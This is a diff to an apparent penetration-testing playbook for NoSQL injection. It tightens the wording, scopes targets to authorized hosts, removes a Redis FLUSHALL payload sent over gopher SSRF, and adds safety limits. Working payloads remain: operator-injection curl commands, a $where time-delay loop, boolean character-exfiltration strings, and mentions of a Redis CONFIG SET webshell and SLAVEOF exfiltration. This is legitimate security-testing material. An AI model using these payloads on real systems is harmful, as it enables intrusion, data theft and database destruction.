@@ -94,12 +94,12 @@ curl -s -X POST https://$TARGET/api/login \
 ### Phase 2 — URL Parameter Injection
 ```bash
 # Array notation (Express/PHP-style)
-curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
-curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"
+curl --globoff 'https://<authorized-host>/api/users?username[$gt]=&password[$gt]='
+curl --globoff 'https://<authorized-host>/api/search?q[$regex]=.*&q[$options]=i'
 
 # POST form data
 curl "https://$TARGET/api/login" \
-  --data "username[$gt]=&password[$gt]="
+  --data 'username[$gt]=&password[$gt]='
 ```
 
 ### Phase 3 — $where Blind Injection (time-based)
@@ -108,7 +108,7 @@ curl "https://$TARGET/api/login" \
 curl -s -X POST https://$TARGET/api/search \
   -H "Content-Type: application/json" \
   -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
-# If response takes 5+ seconds → $where injection confirmed
+# A delay is only a lead: compare repeated approved controls and rule out network/server load.
 
 # Blind data exfil (username starts with 'a'?)
 curl -s -X POST https://$TARGET/api/search \
@@ -119,7 +119,7 @@ curl -s -X POST https://$TARGET/api/search \
 ### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
 When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
 ```
-fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
+fuzz:  ' " ` { ; $         # a 500/behavior change is a lead, not proof of query execution
 ' || '1'=='1               # always-true (string-context breakout)
 ' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
 ```
@@ -149,7 +149,9 @@ nosqlmap -u "https://$TARGET/api/login" --attack 2
 ### Phase 6 — Redis via SSRF
 ```bash
 # If SSRF found, probe internal Redis via gopher://
-curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
+# Do not use FLUSHALL or configuration writes as a reachability test.
+# In an approved disposable lab, use a non-mutating Redis PING/controlled
+# connection observation through the authorized SSRF path instead.
 
 # CONFIG SET webshell (if Redis has write access to web root)
 # Use SLAVEOF for OOB data exfil
@@ -208,3 +210,5 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+Use only approved test accounts and synthetic records. Stop at the minimum proof; do not dump user collections, run credential stuffing, alter Redis configuration or install a shell. Broad timing loops can exhaust database CPU and require a separately bounded lab plan. Parser behavior, server-side JavaScript support and injection context vary by version; framework fingerprints alone do not establish vulnerability.
